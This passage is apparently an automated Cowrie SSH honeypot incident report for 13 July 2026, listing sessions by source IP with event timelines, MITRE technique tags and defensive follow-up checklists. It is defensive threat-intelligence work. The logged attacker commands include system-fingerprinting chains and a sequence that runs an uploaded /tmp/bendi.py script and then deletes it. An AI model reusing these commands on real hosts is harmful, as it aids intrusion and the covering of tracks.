| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:46:03` | `cowrie.session.connect` |
| `2026-07-13 05:46:03` | `cowrie.client.version` |
| `2026-07-13 05:46:03` | `cowrie.client.kex` |
| `2026-07-13 05:46:06` | `cowrie.login.success` |
| `2026-07-13 05:46:08` | `cowrie.session.params` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.success` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:08` | `cowrie.command.input` |
| `2026-07-13 05:46:09` | `cowrie.log.closed` |
| `2026-07-13 05:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63b108f8059

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:47 |
| **Last Seen** | 2026-07-13 05:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:47:41` | `cowrie.session.connect` |
| `2026-07-13 05:47:41` | `cowrie.client.version` |
| `2026-07-13 05:47:41` | `cowrie.client.kex` |
| `2026-07-13 05:47:43` | `cowrie.login.success` |
| `2026-07-13 05:47:45` | `cowrie.session.params` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.success` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.command.input` |
| `2026-07-13 05:47:45` | `cowrie.log.closed` |
| `2026-07-13 05:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d75b9429fbea

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-13 05:49 |
| **Last Seen** | 2026-07-13 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:49:34` | `cowrie.session.connect` |
| `2026-07-13 05:49:34` | `cowrie.client.version` |
| `2026-07-13 05:49:35` | `cowrie.client.kex` |
| `2026-07-13 05:49:35` | `cowrie.login.success` |
| `2026-07-13 05:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aaf4e74bf75

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-13 05:49 |
| **Last Seen** | 2026-07-13 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:49:36` | `cowrie.session.connect` |
| `2026-07-13 05:49:36` | `cowrie.client.version` |
| `2026-07-13 05:49:36` | `cowrie.client.kex` |
| `2026-07-13 05:49:36` | `cowrie.login.success` |
| `2026-07-13 05:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39f11cea41d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:49 |
| **Last Seen** | 2026-07-13 05:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:49:46` | `cowrie.session.connect` |
| `2026-07-13 05:49:46` | `cowrie.client.version` |
| `2026-07-13 05:49:46` | `cowrie.client.kex` |
| `2026-07-13 05:49:47` | `cowrie.login.success` |
| `2026-07-13 05:49:48` | `cowrie.session.params` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.success` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.command.input` |
| `2026-07-13 05:49:48` | `cowrie.log.closed` |
| `2026-07-13 05:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5074f4fad05

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-13 05:49 |
| **Last Seen** | 2026-07-13 05:51 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:49:52` | `cowrie.session.connect` |
| `2026-07-13 05:49:52` | `cowrie.client.version` |
| `2026-07-13 05:49:52` | `cowrie.client.kex` |
| `2026-07-13 05:49:53` | `cowrie.login.success` |
| `2026-07-13 05:49:54` | `cowrie.session.file_upload` |
| `2026-07-13 05:49:55` | `cowrie.session.params` |
| `2026-07-13 05:49:55` | `cowrie.command.input` |
| `2026-07-13 05:49:55` | `cowrie.command.input` |
| `2026-07-13 05:49:55` | `cowrie.command.input` |
| `2026-07-13 05:49:55` | `cowrie.command.failed` |
| `2026-07-13 05:49:55` | `cowrie.log.closed` |
| `2026-07-13 05:49:56` | `cowrie.session.params` |
| `2026-07-13 05:49:56` | `cowrie.command.input` |
| `2026-07-13 05:49:56` | `cowrie.log.closed` |
| `2026-07-13 05:49:56` | `cowrie.session.params` |
| `2026-07-13 05:49:56` | `cowrie.command.input` |
| `2026-07-13 05:49:57` | `cowrie.log.closed` |
| `2026-07-13 05:49:57` | `cowrie.session.params` |
| `2026-07-13 05:49:57` | `cowrie.command.input` |
| `2026-07-13 05:49:57` | `cowrie.command.failed` |
| `2026-07-13 05:49:57` | `cowrie.command.failed` |
| `2026-07-13 05:50:58` | `cowrie.session.params` |
| `2026-07-13 05:50:58` | `cowrie.command.input` |
| `2026-07-13 05:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b82fe5ce69

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 05:51 |
| **Last Seen** | 2026-07-13 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:51:47` | `cowrie.session.connect` |
| `2026-07-13 05:51:47` | `cowrie.client.version` |
| `2026-07-13 05:51:47` | `cowrie.client.kex` |
| `2026-07-13 05:51:48` | `cowrie.login.success` |
| `2026-07-13 05:51:48` | `cowrie.session.params` |
| `2026-07-13 05:51:48` | `cowrie.command.input` |
| `2026-07-13 05:51:49` | `cowrie.log.closed` |
| `2026-07-13 05:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6414fa81746d

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-13 05:52 |
| **Last Seen** | 2026-07-13 05:54 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:52:24` | `cowrie.session.connect` |
| `2026-07-13 05:52:24` | `cowrie.client.version` |
| `2026-07-13 05:52:24` | `cowrie.client.kex` |
| `2026-07-13 05:52:25` | `cowrie.login.success` |
| `2026-07-13 05:52:26` | `cowrie.session.file_upload` |
| `2026-07-13 05:52:27` | `cowrie.session.params` |
| `2026-07-13 05:52:27` | `cowrie.command.input` |
| `2026-07-13 05:52:27` | `cowrie.command.input` |
| `2026-07-13 05:52:27` | `cowrie.command.input` |
| `2026-07-13 05:52:27` | `cowrie.command.failed` |
| `2026-07-13 05:52:27` | `cowrie.log.closed` |
| `2026-07-13 05:52:27` | `cowrie.session.params` |
| `2026-07-13 05:52:27` | `cowrie.command.input` |
| `2026-07-13 05:52:27` | `cowrie.log.closed` |
| `2026-07-13 05:52:28` | `cowrie.session.params` |
| `2026-07-13 05:52:28` | `cowrie.command.input` |
| `2026-07-13 05:52:28` | `cowrie.log.closed` |
| `2026-07-13 05:52:29` | `cowrie.session.params` |
| `2026-07-13 05:52:29` | `cowrie.command.input` |
| `2026-07-13 05:52:29` | `cowrie.command.failed` |
| `2026-07-13 05:52:29` | `cowrie.command.failed` |
| `2026-07-13 05:53:30` | `cowrie.session.params` |
| `2026-07-13 05:53:30` | `cowrie.command.input` |
| `2026-07-13 05:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a4ce643ce2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:52 |
| **Last Seen** | 2026-07-13 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:52:49` | `cowrie.session.connect` |
| `2026-07-13 05:52:49` | `cowrie.client.version` |
| `2026-07-13 05:52:49` | `cowrie.client.kex` |
| `2026-07-13 05:52:50` | `cowrie.login.success` |
| `2026-07-13 05:52:50` | `cowrie.session.params` |
| `2026-07-13 05:52:50` | `cowrie.command.input` |
| `2026-07-13 05:52:50` | `cowrie.command.input` |
| `2026-07-13 05:52:50` | `cowrie.command.input` |
| `2026-07-13 05:52:50` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.command.success` |
| `2026-07-13 05:52:51` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.command.input` |
| `2026-07-13 05:52:51` | `cowrie.log.closed` |
| `2026-07-13 05:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea60db90a4f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 05:56 |
| **Last Seen** | 2026-07-13 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:56:33` | `cowrie.session.connect` |
| `2026-07-13 05:56:33` | `cowrie.client.version` |
| `2026-07-13 05:56:33` | `cowrie.client.kex` |
| `2026-07-13 05:56:33` | `cowrie.login.success` |
| `2026-07-13 05:56:33` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:56:33` | `cowrie.direct-tcpip.data` |
| `2026-07-13 05:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91dc5e92fd59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:56 |
| **Last Seen** | 2026-07-13 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:56:53` | `cowrie.session.connect` |
| `2026-07-13 05:56:53` | `cowrie.client.version` |
| `2026-07-13 05:56:53` | `cowrie.client.kex` |
| `2026-07-13 05:56:54` | `cowrie.login.success` |
| `2026-07-13 05:56:55` | `cowrie.session.params` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.success` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:55` | `cowrie.command.input` |
| `2026-07-13 05:56:56` | `cowrie.log.closed` |
| `2026-07-13 05:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15e543b159b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:58 |
| **Last Seen** | 2026-07-13 05:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:58:49` | `cowrie.session.connect` |
| `2026-07-13 05:58:49` | `cowrie.client.version` |
| `2026-07-13 05:58:49` | `cowrie.client.kex` |
| `2026-07-13 05:58:50` | `cowrie.login.success` |
| `2026-07-13 05:58:51` | `cowrie.session.params` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.success` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:51` | `cowrie.command.input` |
| `2026-07-13 05:58:52` | `cowrie.log.closed` |
| `2026-07-13 05:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0a77a157f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:01 |
| **Last Seen** | 2026-07-13 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:01:02` | `cowrie.session.connect` |
| `2026-07-13 06:01:02` | `cowrie.client.version` |
| `2026-07-13 06:01:03` | `cowrie.client.kex` |
| `2026-07-13 06:01:03` | `cowrie.login.success` |
| `2026-07-13 06:01:04` | `cowrie.session.params` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.success` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.command.input` |
| `2026-07-13 06:01:04` | `cowrie.log.closed` |
| `2026-07-13 06:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913f9991f101

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:02 |
| **Last Seen** | 2026-07-13 06:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:02:55` | `cowrie.session.connect` |
| `2026-07-13 06:02:55` | `cowrie.client.version` |
| `2026-07-13 06:02:55` | `cowrie.client.kex` |
| `2026-07-13 06:02:58` | `cowrie.login.success` |
| `2026-07-13 06:02:59` | `cowrie.session.params` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.success` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:02:59` | `cowrie.command.input` |
| `2026-07-13 06:03:00` | `cowrie.log.closed` |
| `2026-07-13 06:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3940d1aa784d

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-13 06:04 |
| **Last Seen** | 2026-07-13 06:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:04:13` | `cowrie.session.connect` |
| `2026-07-13 06:04:14` | `cowrie.client.version` |
| `2026-07-13 06:04:14` | `cowrie.client.kex` |
| `2026-07-13 06:04:16` | `cowrie.login.success` |
| `2026-07-13 06:04:17` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba3e581c3ca

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-13 06:04 |
| **Last Seen** | 2026-07-13 06:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
